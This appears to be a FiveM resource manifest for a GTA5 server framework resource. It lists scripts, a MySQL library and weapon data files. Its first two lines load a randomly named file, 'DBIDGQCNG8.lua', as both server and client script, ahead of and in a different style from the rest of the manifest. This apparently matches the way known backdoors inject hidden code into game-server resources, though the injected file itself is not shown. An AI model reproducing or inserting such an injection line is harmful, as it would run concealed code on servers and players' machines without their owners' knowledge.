server_script "DBIDGQCNG8.lua"
client_script "DBIDGQCNG8.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
server_script("@oxmysql/lib/MySQL.lua")
client_script("@sandbox-pwnzor/client/check.lua")
client_scripts({
	"sh_init.lua",
	"cl_init.lua",
	"core/sh_*.lua",
	"core/cl_*.lua",
	"cl_config.lua",
	"components/cl_*.lua",
})

server_scripts({
	"sh_init.lua",
	"sv_init.lua",
	"sv_config.lua",
	"core/sv_database.js",
	"core/sv_generator.js",
	"core/sv_regex.js",
	"core/sh_*.lua",
	"core/sv_*.lua",
	"components/sv_*.lua",
})

files({
	"weaponanimations.meta",
})

data_file("WEAPONINFO_FILE_PATCH")("weapons.meta")
data_file("WEAPON_ANIMATIONS_FILE")("weaponanimations.meta")

this_is_a_map("yes")
